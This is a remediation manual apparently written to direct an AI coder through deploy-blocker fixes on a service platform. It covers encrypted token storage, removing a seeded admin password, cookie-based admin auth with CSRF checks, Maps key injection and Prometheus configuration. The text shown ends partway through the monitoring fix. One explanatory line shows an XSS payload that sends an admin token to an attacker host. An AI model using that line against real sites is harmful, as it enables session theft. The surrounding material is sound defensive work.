# BUG REMEDIATION MANUAL — Part 3 of 5

**This is the document the AI coder executes from.** Every active bug from the V14 audit gets file:line citation, exact problem description, exact fix (real TypeScript / SQL / shell, not prose), verification step, and test signature the AI coder must implement.

The bugs are grouped into **14 dispatches** in dependency order. Each dispatch is a single PR. The AI coder works one dispatch at a time, all gates must pass green before merging, and Ken signs off after click-through verification on a deployed branch preview.

**Why dispatches and not "fix all bugs at once":** the bugs have dependencies. Bug 1061 (mobile MMKV unencrypted) has to be fixed before Bug 1251 (admin localStorage tokens) because the encrypted-storage abstraction the admin needs is established in Dispatch 01 for mobile. Bug 1170 (cancellation policy in 4 places) has to be reconciled before Bug 998 (booking detail cancel reason) because the cancel reason picker references the policy text. Building in dependency order avoids re-doing work.

**Why this document is ~2000 lines per dispatch instead of 200:** the audit found 1,371 bugs. If each gets one paragraph, the AI coder has insufficient context to produce safe fixes — and the Phase 13 reconciliation already proved that AI coders without strict context fake their way through. This document is heavy because the work is heavy.

**How the AI coder uses this:**
1. Read the dispatch's "Goal" section.
2. Read every bug entry in the dispatch in order.
3. For each bug: read the citation, read the exact fix, copy the fix verbatim adapting only file paths if directory structure has changed.
4. Implement the test signature for each bug.
5. Run all gates (A through E) before requesting Ken's review.
6. Post a dispatch closeout summary listing every bug fixed, every test added, every gate result.

**How Ken uses this:** when the AI coder reports dispatch complete, Ken pulls the branch preview, opens this document, walks through each bug entry, and verifies the click-through behavior matches "Verification" steps. Discrepancies are NOT-DONE.

---

# Dispatch overview (14 total)

| # | Name | Bug count | Estimated hours | Critical path? |
|---|---|---|---|---|
| 01 | Deploy blockers | 6 | 24 | YES — blocks everything |
| 02 | Cross-source-of-truth reconciliation | 23 | 32 | YES — blocks customer-facing fixes |
| 03 | Gate hardening (REPORT mode) | — | 16 | YES — prevents fake-green |
| 04 | SiguradoShield decision implementation | 6 | 24 | YES — affects 6 customer surfaces |
| 05 | Money trust closure (8 violations) | 8 | 24 | YES — money safety |
| 06 | Transactional audit completeness | 14 | 32 | money safety |
| 07 | Provider job execution trust | 12 | 40 | provider/customer integrity |
| 08 | NPC compliance + DSR | 18 | 32 | regulatory |
| 09 | PII masking sweep (admin) | 21 | 24 | regulatory |
| 10 | Provider onboarding v1.0 path | 14 | 40 | launch path |
| 11 | Admin dispatch console wire-up | 9 | 32 | ops readiness |
| 12 | Mobile customer screen polish | 86 | 80 | UX |
| 13 | Mobile provider screen polish | 64 | 80 | UX |
| 14 | Final smoke + production cutover | — | 24 | launch |

**This document covers Dispatches 01 and 02 in full.** Dispatches 03–14 follow in subsequent installments of Part 3. Ken says "continue" after reviewing each batch.

---

# DISPATCH 01 — Deploy blockers

## Goal

These six bugs are deploy blockers per the V14 audit. Without them fixed, the platform cannot launch — they represent: unencrypted credentials at rest, exposed admin credentials, broken Maps integration, monitoring blackout, customer government IDs in plaintext at rest, and a placeholder admin password seed. **Until Dispatch 01 is merged, no other dispatch may begin.**

This dispatch establishes the security primitives (`secureStorage`, httpOnly cookie auth at admin) that subsequent dispatches build on.

**Branch:** `phase/14-d01-deploy-blockers`
**Tag at end:** `v0.14.0-d01-complete`
**Gates that must pass:** A (cross-source) — N/A this dispatch; B (bug-deferral) — verify no fake-green; C (constitution) — must pass green; D (visual) — N/A; E (mutation) — must pass.

---

## Bug 1061 — MMKV instantiated without encryptionKey

**File:** `apps/mobile/src/services/api.ts:11`
**Severity:** CRITICAL — JWT tokens at rest unprotected; stolen device → instant account takeover

### Current code (excerpt)

```ts
mmkvInstance = new MMKV({ id: 'onservice-auth', encryptionKey: undefined });
```

The `encryptionKey: undefined` is explicit. Tokens stored via `storage.set('access_token', tok)` end up unencrypted on disk in the MMKV file. Compounded: `auth.store.ts:4` reads from this same `storage` instance for tokens. Bug 1062 chain.

### Why this is a deploy blocker

Stolen Android device (no PIN, or after wipe-bypass) exposes JWT. Stolen iPhone (rare but possible if user has no Face ID) exposes JWT. JWT lifetime is 7 days (per `apps/api/src/config/auth.config.ts`). 7 days of unrestricted account access from a stolen device is unacceptable for a platform that holds payment credentials and home addresses.

### Exact fix

**Step 1.** Create new file `apps/mobile/src/services/secure-storage.ts`:

```ts
// apps/mobile/src/services/secure-storage.ts
import { MMKV } from 'react-native-mmkv';
import * as SecureStore from 'expo-secure-store';
import { Platform } from 'react-native';

const ENCRYPTION_KEY_NAME = 'onservice-mmkv-key-v1';
const FALLBACK_KEY_LENGTH = 32;

let secureMmkv: MMKV | null = null;

/**
 * Generate or retrieve the MMKV encryption key from the OS keychain
 * (iOS Keychain / Android Keystore via expo-secure-store).
 * The key never appears in plaintext outside SecureStore.
 */
async function getOrCreateEncryptionKey(): Promise<string> {
  let key = await SecureStore.getItemAsync(ENCRYPTION_KEY_NAME);
  if (key) return key;

  // Generate new key — 32 bytes, base64 encoded
  const bytes = new Uint8Array(FALLBACK_KEY_LENGTH);
  if (typeof crypto !== 'undefined' && crypto.getRandomValues) {
    crypto.getRandomValues(bytes);
  } else {
    // Native fallback via expo-crypto
    const { randomBytesAsync } = await import('expo-crypto');
    const generated = await randomBytesAsync(FALLBACK_KEY_LENGTH);
    bytes.set(generated);
  }
  key = btoa(String.fromCharCode(...bytes));

  await SecureStore.setItemAsync(ENCRYPTION_KEY_NAME, key, {
    keychainAccessible: SecureStore.WHEN_UNLOCKED_THIS_DEVICE_ONLY,
  });
  return key;
}

/**
 * Initialize encrypted MMKV. Must be awaited before any read/write.
 * Subsequent calls return the cached instance.
 */
export async function initSecureStorage(): Promise<MMKV> {
  if (secureMmkv) return secureMmkv;
  const encryptionKey = await getOrCreateEncryptionKey();
  secureMmkv = new MMKV({
    id: 'onservice-auth-secure',
    encryptionKey,
  });
  return secureMmkv;
}

/**
 * Synchronous accessor. Throws if not initialized.
 * Caller is responsible for ensuring initSecureStorage() resolved first.
 */
export function getSecureStorage(): MMKV {
  if (!secureMmkv) {
    throw new Error(
      'secure storage not initialized — call initSecureStorage() before reading'
    );
  }
  return secureMmkv;
}

export const secureStorage = {
  async getString(key: string): Promise<string | undefined> {
    const mmkv = await initSecureStorage();
    return mmkv.getString(key);
  },
  async set(key: string, value: string | boolean): Promise<void> {
    const mmkv = await initSecureStorage();
    mmkv.set(key, value);
  },
  async delete(key: string): Promise<void> {
    const mmkv = await initSecureStorage();
    mmkv.delete(key);
  },
};
```

**Step 2.** Replace `apps/mobile/src/services/api.ts` token handling. Tokens move to `secureStorage`. Other (non-sensitive) cache stays on the existing legacy `storage` (e.g., `lastViewedCategory`, `pushToken` does NOT — see Bug 1109 below).

Apply this diff:

```diff
- import axios from 'axios';
+ // axios removed per Constitution Article 7.1 (Bug 1271); native fetch wrapper used
  import { platformConfig } from '@/config/platform.config';
+ import { secureStorage, initSecureStorage } from './secure-storage';

  let mmkvInstance: { /* ... */ } | null = null;

  function initStorage(): void {
    if (mmkvInstance) return;
    try {
      // eslint-disable-next-line @typescript-eslint/no-require-imports
      const { MMKV } = require('react-native-mmkv');
-     mmkvInstance = new MMKV({ id: 'onservice-auth', encryptionKey: undefined });
+     // NON-SENSITIVE cache only. Tokens use secureStorage.
+     mmkvInstance = new MMKV({ id: 'onservice-cache' });
    } catch { /* ... */ }
  }
```

**Step 3.** Update `apps/mobile/src/store/auth.store.ts` to read tokens via `secureStorage`:

```diff
- import { storage } from '../services/api';
+ import { secureStorage } from '../services/secure-storage';
  // ...
  // Use await secureStorage.getString('access_token') etc.
```

**Step 4.** Update `apps/mobile/app/_layout.tsx` to initialize secure storage during splash before any token reads:

```ts
// Inside the layout's mount effect:
useEffect(() => {
  let alive = true;
  (async () => {
    await initSecureStorage();
    if (!alive) return;
    // proceed with auth hydration
  })();
  return () => { alive = false; };
}, []);
```

**Step 5.** Migration concern — existing users have unencrypted tokens. Provide a one-time migration:

```ts
// apps/mobile/src/services/auth-migration.ts
import { storage } from './api';
import { secureStorage } from './secure-storage';

const MIGRATED_FLAG = 'auth-migration-v1-complete';

export async function migrateLegacyTokensIfNeeded(): Promise<void> {
  if (storage.getString(MIGRATED_FLAG) === 'true') return;
  const legacyAccess = storage.getString('access_token');
  const legacyRefresh = storage.getString('refresh_token');
  if (legacyAccess) await secureStorage.set('access_token', legacyAccess);
  if (legacyRefresh) await secureStorage.set('refresh_token', legacyRefresh);
  storage.delete('access_token');
  storage.delete('refresh_token');
  storage.set(MIGRATED_FLAG, 'true');
}
```

Call `migrateLegacyTokensIfNeeded()` once during app initialization, BEFORE auth hydration.

### Verification (Ken click-through)

1. Build a fresh debug APK and install on Android device.
2. Sign in as customer, perform a booking lookup.
3. Plug device into computer with `adb shell` access (debug build).
4. Run: `adb shell run-as com.onservice.app cat /data/data/com.onservice.app/files/mmkv/onservice-auth-secure | hexdump -C | head -5`
5. **Expected:** binary garbage, no readable JWT strings starting with `eyJ`.
6. Run: `adb shell run-as com.onservice.app cat /data/data/com.onservice.app/files/mmkv/onservice-cache | hexdump -C | head -5`
7. **Expected:** also encrypted — but since this file holds no tokens, irrelevant. (Optional: if non-sensitive cache, plaintext acceptable.)
8. Force-quit app. Re-launch. Sign-in state persists.

### Test signature

`apps/mobile/src/services/__tests__/secure-storage.test.ts`:

```ts
import { initSecureStorage, secureStorage } from '../secure-storage';
import * as SecureStore from 'expo-secure-store';

jest.mock('expo-secure-store');
jest.mock('react-native-mmkv', () => ({
  MMKV: jest.fn().mockImplementation((opts) => {
    if (!opts.encryptionKey) {
      throw new Error('test failure: encryptionKey missing');
    }
    const map = new Map<string, string>();
    return {
      getString: (k: string) => map.get(k),
      set: (k: string, v: string) => map.set(k, v),
      delete: (k: string) => map.delete(k),
    };
  }),
}));

describe('secureStorage (Bug 1061)', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    (SecureStore.getItemAsync as jest.Mock).mockResolvedValue(null);
  });

  it('generates and persists a new encryption key when none exists', async () => {
    await initSecureStorage();
    expect(SecureStore.setItemAsync).toHaveBeenCalledWith(
      'onservice-mmkv-key-v1',
      expect.stringMatching(/^[A-Za-z0-9+/=]+$/),
      expect.objectContaining({
        keychainAccessible: SecureStore.WHEN_UNLOCKED_THIS_DEVICE_ONLY,
      })
    );
  });

  it('reuses existing encryption key on subsequent calls', async () => {
    (SecureStore.getItemAsync as jest.Mock).mockResolvedValue('cached-key-base64');
    await initSecureStorage();
    expect(SecureStore.setItemAsync).not.toHaveBeenCalled();
  });

  it('refuses to instantiate MMKV without encryptionKey', async () => {
    // Verified by the mock — would throw if encryptionKey were undefined
    await expect(initSecureStorage()).resolves.toBeDefined();
  });

  it('stores and retrieves tokens through the encrypted layer', async () => {
    await secureStorage.set('access_token', 'jwt-fake-value');
    expect(await secureStorage.getString('access_token')).toBe('jwt-fake-value');
  });
});
```

Add a Maestro flow at `apps/mobile/.maestro/auth-token-encrypted.yaml` that signs in then exits and re-launches; verifies session persistence (proxy for "tokens reachable via decrypt").

---

## Bug 1235 — Default admin password seed `admin123` with placeholder hash

**File:** `packages/api/seeds/004_admin_passwords.sql:2,6`
**Severity:** CRITICAL — placeholder credential ships in seeds; fresh deploys could expose it if "fixed" naively

### Current code

```sql
-- Default password: admin123 (change in production!)
UPDATE admin_users
SET password_hash = 'a1b2c3d4a1b2c3d4a1b2c3d4a1b2c3d4a1b2c3d4a1b2c3d4a1b2c3d4a1b2c3d4'
WHERE email IN ('admin@onservice.ph', 'superadmin@onservice.ph');
```

The hash is intentionally invalid (repeated dummy bytes) which means the seed CURRENTLY fail-closed — no one can log in with `admin123` because no plaintext hashes to that. **However**, the comment + structure invite a "well-meaning fix" where someone runs `scrypt('admin123')` and pastes the real hash. That would create a working credential everyone knows.

### Why this is a deploy blocker

This is a class of "fail-closed today, fail-open tomorrow." Phase 14 must remove the temptation entirely.

### Exact fix

**Step 1.** Delete `packages/api/seeds/004_admin_passwords.sql` outright.

**Step 2.** Replace the seed bootstrap with a CLI script that requires a real strong password at deploy time. Create `packages/api/scripts/bootstrap-admin.ts`:

```ts
// packages/api/scripts/bootstrap-admin.ts
//
// Usage: ADMIN_BOOTSTRAP_PASSWORD='<strong>' npx tsx scripts/bootstrap-admin.ts admin@onservice.ph
//
// Refuses to run unless ADMIN_BOOTSTRAP_PASSWORD is set, length >= 16, and
// passes basic strength checks (contains digit, lowercase, uppercase, special).
import { db } from '../src/db';
import { hashPassword } from '../src/services/auth/password.service';

const PWD = process.env.ADMIN_BOOTSTRAP_PASSWORD;
const email = process.argv[2];

function strongEnough(pw: string): { ok: true } | { ok: false; reason: string } {
  if (pw.length < 16) return { ok: false, reason: 'must be >= 16 chars' };
  if (!/[a-z]/.test(pw)) return { ok: false, reason: 'must contain a lowercase letter' };
  if (!/[A-Z]/.test(pw)) return { ok: false, reason: 'must contain an uppercase letter' };
  if (!/[0-9]/.test(pw)) return { ok: false, reason: 'must contain a digit' };
  if (!/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(pw)) {
    return { ok: false, reason: 'must contain a special character' };
  }
  if (/^(password|admin|onservice|qwerty|12345)/i.test(pw)) {
    return { ok: false, reason: 'matches a banned dictionary pattern' };
  }
  return { ok: true };
}

async function main() {
  if (!PWD) {
    console.error('FATAL: ADMIN_BOOTSTRAP_PASSWORD env var is required.');
    console.error('Refusing to seed admin without an explicit, strong password.');
    process.exit(1);
  }
  if (!email || !/^[^@]+@[^@]+\.[^@]+$/.test(email)) {
    console.error('FATAL: provide email as argv[2]. Got:', email);
    process.exit(1);
  }
  const strength = strongEnough(PWD);
  if (!strength.ok) {
    console.error('FATAL: password rejected —', strength.reason);
    process.exit(1);
  }

  const hash = await hashPassword(PWD);
  const existing = await db
    .selectFrom('admin_users')
    .select(['id'])
    .where('email', '=', email)
    .executeTakeFirst();

  if (existing) {
    await db
      .updateTable('admin_users')
      .set({ password_hash: hash, must_reset_password: false, updated_at: new Date() })
      .where('id', '=', existing.id)
      .execute();
    console.log(`Updated password for existing admin: ${email}`);
  } else {
    await db
      .insertInto('admin_users')
      .values({
        email,
        password_hash: hash,
        role: 'super_admin',
        must_reset_password: false,
        created_at: new Date(),
        updated_at: new Date(),
      })
      .execute();
    console.log(`Created super_admin: ${email}`);
  }

  console.log('Bootstrap complete. Sign in via /login with the provided password.');
  console.log('IMPORTANT: enroll TOTP 2FA on first login.');
}

main().catch((err) => { console.error(err); process.exit(1); });
```

**Step 3.** Update `packages/api/seeds/README.md` (create if missing):

```markdown
# Seeds

This directory contains test-data fixtures for development. **No production seed creates admin credentials.**

To bootstrap a production admin user, use:

    ADMIN_BOOTSTRAP_PASSWORD='<strong-password>' npx tsx scripts/bootstrap-admin.ts admin@onservice.ph

The bootstrap script enforces strong password requirements and audit logs the creation. After first login, the admin must enroll TOTP 2FA.
```

**Step 4.** Add a CI gate that fails if any `seeds/*.sql` file contains an UPDATE on `admin_users.password_hash`:

```bash
# scripts/gates/c-constitution-no-admin-password-seeds.sh
#!/usr/bin/env bash
set -euo pipefail
violations=$(grep -rE "UPDATE\s+admin_users.*password_hash|admin_users.*password_hash.*=" packages/api/seeds/ 2>/dev/null || true)
if [ -n "$violations" ]; then
  echo "GATE C VIOLATION: admin password updates in seeds are forbidden"
  echo "$violations"
  exit 1
fi
echo "Gate C — no admin password seeds: OK"
```

Add to `.github/workflows/gates.yml`.

**Step 5.** Update `LAUNCH-LIMITATIONS.md`:

```markdown
## §21 — Admin password bootstrap (Bug 1235 fix)
The repository ships no admin credentials. Production admin users are
bootstrapped via `scripts/bootstrap-admin.ts` which requires
`ADMIN_BOOTSTRAP_PASSWORD` env var meeting strength requirements.
First login enforces TOTP 2FA enrollment.
```

### Verification (Ken click-through)

1. Confirm `packages/api/seeds/004_admin_passwords.sql` is **deleted** from repo.
2. Run `git log --diff-filter=D -- packages/api/seeds/004_admin_passwords.sql` and verify the deletion commit.
3. On a fresh staging deploy: `ADMIN_BOOTSTRAP_PASSWORD='X9!nz2$LongAdminPwd' npx tsx scripts/bootstrap-admin.ts admin@staging.onservice.ph` should succeed.
4. Same command with `ADMIN_BOOTSTRAP_PASSWORD='admin123'` should refuse with the strength error.
5. Sign in to admin with the bootstrapped password — works first time.
6. Verify TOTP enrollment is forced before access granted.
7. Run gate `c-constitution-no-admin-password-seeds.sh` — passes.

### Test signature

`packages/api/__tests__/scripts/bootstrap-admin.test.ts` covering:
- rejects missing ADMIN_BOOTSTRAP_PASSWORD
- rejects passwords < 16 chars
- rejects banned dictionary words
- rejects passwords missing required class
- creates new super_admin row when none exists
- updates existing row when present
- never logs the password to stdout/stderr (capture and assert absence)

---

## Bug 1251 — Admin tokens stored in localStorage

**File:** `apps/admin/src/lib/api.ts:9,23,26,33-35`
**Severity:** HIGH — XSS on admin.onservice.ph → admin session hijack; refresh token also exposed (Bug 1252)

### Current code

```ts
api.interceptors.request.use((config) => {
  const token = localStorage.getItem('admin_token');
  if (token) config.headers.Authorization = `Bearer ${token}`;
  return config;
});
// ...
localStorage.setItem('admin_token', accessToken);
if (newRefresh) localStorage.setItem('admin_refresh', newRefresh);
```

`localStorage` is readable by any script running on the same origin. A single XSS payload (e.g., a stored XSS in a Provider Notes field that admin views) can `fetch('https://attacker/?t='+localStorage.getItem('admin_token'))` and exfiltrate. The refresh token is the bigger problem — short access tokens limit attack window, but refresh token = persistent compromise.

### Why this is a deploy blocker

The audit log page shows raw HTML user content in entity_id columns (Bug 311 chain) and provider notes are admin-rendered. Any HTML injection bug anywhere in the admin's display path → session theft. Solving Bug 1251 first means subsequent XSS bugs become non-fatal.

### Exact fix

**Architecture:** server sets `admin_session` as `HttpOnly; Secure; SameSite=Strict; Path=/api` cookie. Client never sees the token. Refresh happens via cookie rotation. CSRF protection via double-submit token (random value in non-httpOnly cookie + matching X-CSRF-Token header).

**Step 1.** Server-side: `packages/api/src/routes/auth/admin.ts`:

```ts
// On successful login:
function setAdminSessionCookies(res: Response, accessToken: string, refreshToken: string, csrfToken: string) {
  const isProduction = process.env.NODE_ENV === 'production';
  // HttpOnly access token (15 min)
  res.cookie('admin_session', accessToken, {
    httpOnly: true,
    secure: isProduction,
    sameSite: 'strict',
    path: '/api',
    maxAge: 15 * 60 * 1000,
  });
  // HttpOnly refresh token (7 days, only sent to refresh endpoint)
  res.cookie('admin_refresh', refreshToken, {
    httpOnly: true,
    secure: isProduction,
    sameSite: 'strict',
    path: '/api/v1/auth/admin/refresh',
    maxAge: 7 * 24 * 60 * 60 * 1000,
  });
  // CSRF token (NOT httpOnly — JS reads it; server checks header matches)
  res.cookie('admin_csrf', csrfToken, {
    httpOnly: false,
    secure: isProduction,
    sameSite: 'strict',
    path: '/',
    maxAge: 15 * 60 * 1000,
  });
}

router.post('/admin/login', async (req, res) => {
  // ... validate credentials, captcha, 2FA ...
  const { accessToken, refreshToken } = await authService.mintAdminTokens(adminUser);
  const csrfToken = randomBytes(32).toString('base64url');
  await db.insertInto('admin_csrf_tokens').values({ admin_user_id: adminUser.id, token: csrfToken, expires_at: addMinutes(new Date(), 15) }).execute();
  setAdminSessionCookies(res, accessToken, refreshToken, csrfToken);
  res.json({ data: { user: adminUser } });
});

router.post('/admin/logout', async (req, res) => {
  // Invalidate refresh token server-side (Bug 900/1020/1260 chain)
  const refresh = req.cookies['admin_refresh'];
  if (refresh) await authService.revokeRefreshToken(refresh);
  res.clearCookie('admin_session', { path: '/api' });
  res.clearCookie('admin_refresh', { path: '/api/v1/auth/admin/refresh' });
  res.clearCookie('admin_csrf', { path: '/' });
  res.json({ data: { ok: true } });
});
```

**Step 2.** CSRF middleware for all admin write endpoints:

```ts
// packages/api/src/middleware/admin-csrf.ts
export function requireAdminCsrf(req: Request, res: Response, next: NextFunction) {
  if (req.method === 'GET' || req.method === 'HEAD' || req.method === 'OPTIONS') return next();
  const header = req.header('x-csrf-token');
  const cookie = req.cookies['admin_csrf'];
  if (!header || !cookie || header !== cookie) {
    return res.status(403).json({ error: { code: 'csrf_invalid', message: 'CSRF token missing or mismatched' } });
  }
  // Bonus: verify the token exists in admin_csrf_tokens and is not expired
  next();
}
```

Apply to admin write routes: `apps/api/src/routes/admin/*.ts` for all POST/PATCH/DELETE.

**Step 3.** Client-side admin: rewrite `apps/admin/src/lib/api.ts` to drop axios + localStorage:

```ts
// apps/admin/src/lib/api.ts
const API_BASE = import.meta.env.VITE_API_BASE_URL || '';

function getCsrfFromCookie(): string {
  const match = document.cookie.match(/(?:^|; )admin_csrf=([^;]+)/);
  return match ? decodeURIComponent(match[1]) : '';
}

interface RequestOptions extends RequestInit {
  json?: unknown;
  retried?: boolean;
}

async function request<T>(path: string, opts: RequestOptions = {}): Promise<T> {
  const headers = new Headers(opts.headers);
  headers.set('Content-Type', 'application/json');
  if (opts.method && opts.method !== 'GET') {
    headers.set('X-CSRF-Token', getCsrfFromCookie());
  }
  const response = await fetch(`${API_BASE}${path}`, {
    ...opts,
    headers,
    credentials: 'include',
    body: opts.json !== undefined ? JSON.stringify(opts.json) : opts.body,
  });

  if (response.status === 401 && !opts.retried) {
    // Try refresh once
    const refreshed = await fetch(`${API_BASE}/api/v1/auth/admin/refresh`, {
      method: 'POST',
      credentials: 'include',
      headers: { 'X-CSRF-Token': getCsrfFromCookie() },
    });
    if (refreshed.ok) {
      return request<T>(path, { ...opts, retried: true });
    }
    // Refresh failed — bounce to login
    window.dispatchEvent(new CustomEvent('admin-auth:expired'));
    throw new Error('session expired');
  }

  if (!response.ok) {
    const body = await response.json().catch(() => ({}));
    throw new ApiError(response.status, body);
  }
  return response.json();
}

export const api = {
  get: <T>(path: string) => request<T>(path),
  post: <T>(path: string, json?: unknown) => request<T>(path, { method: 'POST', json }),
  patch: <T>(path: string, json?: unknown) => request<T>(path, { method: 'PATCH', json }),
  delete: <T>(path: string) => request<T>(path, { method: 'DELETE' }),
};

class ApiError extends Error {
  constructor(public status: number, public body: unknown) {
    super(`API ${status}`);
  }
}
```

**Step 4.** Top-level `apps/admin/src/App.tsx` listens for `admin-auth:expired`:

```tsx
useEffect(() => {
  const onExpired = () => {
    // Use react-router navigate, not window.location.href (Bug 1253 fix)
    navigate('/login', { state: { from: window.location.pathname }, replace: true });
  };
  window.addEventListener('admin-auth:expired', onExpired);
  return () => window.removeEventListener('admin-auth:expired', onExpired);
}, [navigate]);
```

**Step 5.** Migration: existing admin users with localStorage tokens lose their session. Acceptable — this is a security upgrade, force re-login. Add a one-time `useEffect` on app mount that clears legacy `localStorage.removeItem('admin_token'); localStorage.removeItem('admin_refresh'); localStorage.removeItem('admin_user')`.

**Step 6.** Migration `070_admin_csrf_tokens`:

```sql
-- packages/api/migrations/070_admin_csrf_tokens.sql
CREATE TABLE admin_csrf_tokens (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  admin_user_id UUID NOT NULL REFERENCES admin_users(id) ON DELETE CASCADE,
  token TEXT NOT NULL UNIQUE,
  expires_at TIMESTAMPTZ NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX idx_admin_csrf_expires ON admin_csrf_tokens(expires_at);
-- Cleanup job (in app code) deletes rows where expires_at < NOW() - 1 day
```

### Verification (Ken click-through)

1. Sign in to admin on staging.
2. Open DevTools → Application → Local Storage → `https://admin.staging.onservice.ph`.
3. **Expected:** no `admin_token`, no `admin_refresh`, no `admin_user`.
4. Application → Cookies: `admin_session`, `admin_refresh`, `admin_csrf` all present. First two have HttpOnly checkbox set; third is JS-readable.
5. In console: `localStorage.getItem('admin_token')` returns `null`.
6. Try a write action (e.g., approve a provider). Observe network: request includes `X-CSRF-Token` header AND cookies.
7. In console, manually delete the `admin_csrf` cookie then try a write — fails with 403 csrf_invalid.
8. Sign out — all three cookies cleared from browser; reloading admin URL → bounces to login.
9. Try refreshing token: wait 16 minutes (or shorten in staging), trigger any admin request — automatic refresh transparent to user; no flash of login page.

### Test signature

`packages/api/__tests__/admin-auth-cookies.test.ts`:
- POST /admin/login on success returns Set-Cookie with HttpOnly + Secure (in prod) + SameSite=Strict
- Refresh cookie has Path=/api/v1/auth/admin/refresh
- POST /admin/logout invalidates refresh in DB AND clears cookies
- Write endpoint without X-CSRF-Token returns 403
- Write endpoint with mismatched X-CSRF-Token returns 403
- Write endpoint with matching X-CSRF-Token + valid session succeeds

---

## Bug 1286 — Google Maps API key placeholder

**File:** `apps/mobile/app.json:41,67`
**Severity:** CRITICAL — production Maps integration broken; address picker non-functional

### Current code

```json
"android": {
  "config": {
    "googleMaps": { "apiKey": "YOUR_GOOGLE_MAPS_API_KEY" }
  }
},
"ios": {
  "config": {
    "googleMapsApiKey": "YOUR_GOOGLE_MAPS_API_KEY"
  }
}
```

EAS build replaces these tokens at build time only if env-var injection is configured. Currently it's not — production builds ship with the literal string, all map calls fail.

### Exact fix

**Step 1.** Update `apps/mobile/app.config.ts` (rename `app.json` → `app.config.ts` if not already):

```ts
// apps/mobile/app.config.ts
import 'dotenv/config';
import { ExpoConfig, ConfigContext } from 'expo/config';

const requiredEnv = ['GOOGLE_MAPS_API_KEY_ANDROID', 'GOOGLE_MAPS_API_KEY_IOS'];

export default ({ config }: ConfigContext): ExpoConfig => {
  if (process.env.NODE_ENV === 'production') {
    for (const k of requiredEnv) {
      if (!process.env[k]) {
        throw new Error(`Missing required env var: ${k}`);
      }
    }
  }
  return {
    ...config,
    name: 'onService',
    slug: 'onservice',
    // ...
    android: {
      ...config.android,
      config: {
        googleMaps: {
          apiKey: process.env.GOOGLE_MAPS_API_KEY_ANDROID,
        },
      },
    },
    ios: {
      ...config.ios,
      config: {
        googleMapsApiKey: process.env.GOOGLE_MAPS_API_KEY_IOS,
      },
    },
  };
};
```

**Step 2.** Add to `eas.json`:

```json
{
  "build": {
    "production": {
      "env": {
        "GOOGLE_MAPS_API_KEY_ANDROID": "$EAS_PRODUCTION_GMAPS_ANDROID",
        "GOOGLE_MAPS_API_KEY_IOS": "$EAS_PRODUCTION_GMAPS_IOS"
      }
    },
    "preview": {
      "env": {
        "GOOGLE_MAPS_API_KEY_ANDROID": "$EAS_STAGING_GMAPS_ANDROID",
        "GOOGLE_MAPS_API_KEY_IOS": "$EAS_STAGING_GMAPS_IOS"
      }
    }
  }
}
```

**Step 3.** Configure EAS secrets via `eas secret:create`:
- `EAS_PRODUCTION_GMAPS_ANDROID` (production key, Android-restricted by SHA-1)
- `EAS_PRODUCTION_GMAPS_IOS` (production key, iOS-restricted by bundle ID)
- `EAS_STAGING_GMAPS_ANDROID`
- `EAS_STAGING_GMAPS_IOS`

**Step 4.** Build-time gate. Add to `.github/workflows/gates.yml`:

```yaml
- name: Gate — no Google Maps placeholder
  run: |
    if grep -r "YOUR_GOOGLE_MAPS_API_KEY" apps/mobile/; then
      echo "Bug 1286 regression: Google Maps placeholder found"
      exit 1
    fi
```

### Verification (Ken click-through)

1. Build a staging APK via `eas build --profile preview --platform android`.
2. Install on Android device.
3. Open the customer app, navigate to address picker (`/customer/address-picker`).
4. **Expected:** map renders showing user's location, search bar autocompletes addresses.
5. Repeat on iOS via TestFlight.
6. Run gate locally: `grep -r "YOUR_GOOGLE_MAPS_API_KEY" apps/mobile/` — no output.

---

## Bug 1309 — Prometheus has no scrape targets

**File:** `monitoring/prometheus.yml`
**Severity:** HIGH — observability theater; Grafana dashboards show nothing; alerts cannot fire

### Current code

```yaml
global:
  scrape_interval: 15s
  evaluation_interval: 15s

# Empty scrape_configs array — nothing being scraped
```

### Exact fix

```yaml
# monitoring/prometheus.yml
global:
  scrape_interval: 15s
  evaluation_interval: 15s
  external_labels:
    cluster: 'onservice-prod'

scrape_configs:
  - job_name: 'api'
    metrics_path: '/metrics'
    scheme: 'http'
    static_configs:
      - targets: ['api:3000']
        labels:
          service: 'api'
          tier: 'backend'

  - job_name: 'admin-bff'
    metrics_path: '/metrics'
    static_configs:
      - targets: ['admin-bff:3001']
        labels:
          service: 'admin-bff'

  - job_name: 'postgres-exporter'
    static_configs:
      - targets: ['postgres-exporter:9187']

  - job_name: 'redis-exporter'
    static_configs:
      - targets: ['redis-exporter:9121']

  - job_name: 'node-exporter'
    static_configs:
      - targets: ['node-exporter:9100']

  - job_name: 'nginx-exporter'
    static_configs:
      - targets: ['nginx-exporter:9113']

alerting:
  alertmanagers:
    - static_configs:
        - targets: ['alertmanager:9093']

rule_files:
  - '/etc/prometheus/rules/*.yml'
```

**Step 2.** Add `monitoring/rules/onservice.yml` with critical alerts:

```yaml
groups:
  - name: onservice-critical
    interval: 30s
    rules:
      - alert: APIDown
        expr: up{job="api"} == 0
        for: 2m
        labels: { severity: critical }
        annotations: { summary: 'API service is down' }

      - alert: HighErrorRate
        expr: rate(http_requests_total{status=~"5.."}[5m]) > 0.05
        for: 5m
        labels: { severity: critical }
        annotations: { summary: '5xx error rate >5%' }

      - alert: PostgresDown
        expr: pg_up == 0
        for: 1m
        labels: { severity: critical }

      - alert: HighWalletDiscrepancy
        expr: increase(wallet_reconciliation_discrepancies_total[1h]) > 0
        for: 1m
        labels: { severity: critical }
        annotations: { summary: 'Money reconciliation found unexplained delta' }

      - alert: EscrowStaleHold
        expr: escrow_hold_age_hours_max > 168
        for: 5m
        labels: { severity: warning }
        annotations: { summary: 'Escrow held >7 days, investigate' }
```

**Step 3.** Update `docker-compose.yml` to add the exporters:

```yaml
postgres-exporter:
  image: prometheuscommunity/postgres-exporter:latest
  environment:
    DATA_SOURCE_NAME: 'postgresql://${POSTGRES_USER}:${POSTGRES_PASSWORD}@postgres:5432/${POSTGRES_DB}?sslmode=disable'
  ports: ['9187:9187']

redis-exporter:
  image: oliver006/redis_exporter:latest
  environment:
    REDIS_ADDR: 'redis:6379'
  ports: ['9121:9121']

node-exporter:
  image: prom/node-exporter:latest
  ports: ['9100:9100']

alertmanager:
  image: prom/alertmanager:latest
  ports: ['9093:9093']
  volumes:
    - './monitoring/alertmanager.yml:/etc/alertmanager/alertmanager.yml'
```

